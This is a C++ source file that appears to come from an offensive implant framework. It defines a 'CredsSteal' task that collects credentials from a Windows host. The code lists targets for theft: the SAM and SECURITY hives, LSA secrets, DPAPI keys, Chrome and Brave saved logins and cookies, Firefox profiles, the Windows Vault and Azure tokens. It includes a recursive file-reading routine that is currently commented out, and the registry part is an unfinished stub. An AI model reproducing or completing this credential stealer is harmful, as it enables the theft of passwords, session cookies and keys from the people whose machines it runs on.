#include "core/task.hpp"

 namespace Task::Helper::Creds
    {
        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromRegistryHives(const std::wstring& wUserSID)
        {
            std::map<std::wstring, std::vector<std::wstring>> result;

            std::vector<std::wstring> wTargetHives = {
                L"HKCU\\Software\\Microsoft\\SystemCertificates",
                L"HKLM\\SAM",
                L"HKLM\\Security\\Policy\\Secrets",
                L"HKLM\\Software\\Microsoft\\EnterpriseCertificates",
                L"HKLM\\Software\\Microsoft\\SystemCertificates",
                L"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                L"HKLM\\Software\\Policies\\Microsoft\\SystemCertificates",
                L"HKU\\" + wUserSID + L"\\Software\\Microsoft\\SystemCertificates"
            };

            for (const std::wstring& wTarget : wTargetHives) {
                std::vector<std::wstring> wCreds = {};

                // TODO
                // ...
            }

            return result;
        }

        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromFiles(
            const std::wstring& wUserName,
            const std::wstring& wUserSID
        ) {
            std::map<std::wstring, std::vector<std::wstring>> result;

            // Get env paths.
            std::wstring envAppData = System::Env::GetStrings(L"%APPDATA%");
            std::wstring envLocalAppData = System::Env::GetStrings(L"%LOCALAPPDATA%");
            std::wstring envSystemDrive = System::Env::GetStrings(L"%SYSTEMDRIVE%");
            std::wstring envSystemRoot = System::Env::GetStrings(L"%SYSTEMROOT%");

            // Currently not working on this code.

            // std::vector<std::wstring> wTargets = {
            //     envAppData + L"\\Microsoft\\SystemCertificates\\My\\Certificates",
            //     envAppData + L"\\Microsoft\\Credentials",
            //     envAppData + L"\\Microsoft\\Crypto\\RSA\\" + wUserSID,
            //     envAppData + L"\\Microsoft\\Crypto\\Keys",
            //     envAppData + L"\\Microsoft\\Protect",
            //     envAppData + L"\\Mozilla\\Firefox\\Profiles",
            //     envLocalAppData + L"\\BraveSoftware\\Brave-Browser\\User Data\\PROFILE\\Login Data",
            //     envLocalAppData + L"\\BraveSoftware\\Brave-Browser\\User Data\\PROFILE\\Cookies",
            //     envLocalAppData + L"\\Google\\Chrome\\User Data\\Default\\Cookies",
            //     envLocalAppData + L"\\Google\\Chrome\\User Data\\Default\\Login Data",
            //     envLocalAppData + L"\\Microsoft\\Vault",
            //     envSystemDrive + L"\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys",
            //     // envSystemDrive + L"\\Users\\" + wUserName + L"\\.Azure",
            //     envSystemDrive + L"\\Users\\" + wUserName + L"\\.Azure\\AzureRmContext.json",
            //     envSystemRoot + L"\\System32\\Config\\SAM",
            //     envSystemRoot + L"\\System32\\Config\\SECURITY"
            // };

            // for (const std::wstring& wTarget : wTargets) {
            //     // Check if the target is a file or a directory
            //     DWORD dwAttr = GetFileAttributesW(wTarget.c_str());
            //     if (dwAttr == INVALID_FILE_ATTRIBUTES)
            //     {
            //         continue;
            //     }

            //     if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
            //     {
            //         // Get file contents recursively in the directory.
            //         std::vector<std::wstring> files = System::Fs::GetFilesInDirectory(wTarget, TRUE);

            //         // Get file contents.
            //         std::vector<std::wstring> wCreds = {};
            //         for (const std::wstring& wFile : files) {

            //             std::vector<char> readBytes = System::Fs::ReadBytesFromFile(wFile);
            //             if (readBytes.size() == 0)
            //             {
            //                 continue;
            //             }

            //             std::wstring wCred = Utils::Convert::UTF8Decode(std::string(readBytes.begin(), readBytes.end()));
            //             wCreds.push_back(wCred);

            //             result.insert(std::make_pair(wFile, wCreds));
            //         }
            //     }
            //     else
            //     {
            //         std::vector<std::wstring> wCreds = {};

            //         // Get the file contents.
            //         std::vector<char> readBytes = System::Fs::ReadBytesFromFile(wTarget);
            //         if (readBytes.size() == 0)
            //         {
            //             continue;
            //         }

            //         std::wstring wCred = Utils::Convert::UTF8Decode(std::string(readBytes.begin(), readByte.end()));
            //         wCreds.push_back(wCred);

            //         result.insert(std::make_pair(wTarget, wCreds));
            //     }
            // }

            return result;
        }
    }

namespace Task
{
    std::wstring CredsSteal()
    {
        std::wstring result = L"";

        std::wstring wAccountName = System::User::GetAccountName();
        if (wAccountName == L"")
        {
            return L"Error: Failed to get the current account name.";
        }
        std::vector<std::wstring> wAccountNameSplit = Utils::Split::Split(wAccountName, L'\\');
        std::wstring wUserName = wAccountNameSplit[1];

        std::wstring wUserSID = System::User::GetSID();
        if (wUserSID == L"")
        {
            return L"Error: Failed to get the current user SID.";
        }

        // std::map<std::wstring, std::vector<std::wstring>> wCredsFromRegistryHives = Task::Helper::Creds::StealCredsFromRegistryHives(wUserSID);
        std::map<std::wstring, std::vector<std::wstring>> wCredsFromFiles = Task::Helper::Creds::StealCredsFromFiles(wUserName, wUserSID);

        if (wCredsFromFiles.size() == 0)
        {
            return L"Credentials not found.";
        }

        auto iter = wCredsFromFiles.begin();
        while (iter != wCredsFromFiles.end()) {
            std::vector<std::wstring> wCreds = iter->second;
            if (wCreds.size() > 0)
            {
                std::wstring wTargetFile = iter->first;
                result += wTargetFile + L":\n";

                for (DWORD i = 0; i < wCreds.size(); i++)
                {
                    result += L" " + wCreds[i] + L"\n";
                }
            }

            ++iter;
        }

        if (result == L"")
        {
            return L"Credentials not found.";
        }

        return result;
    }
}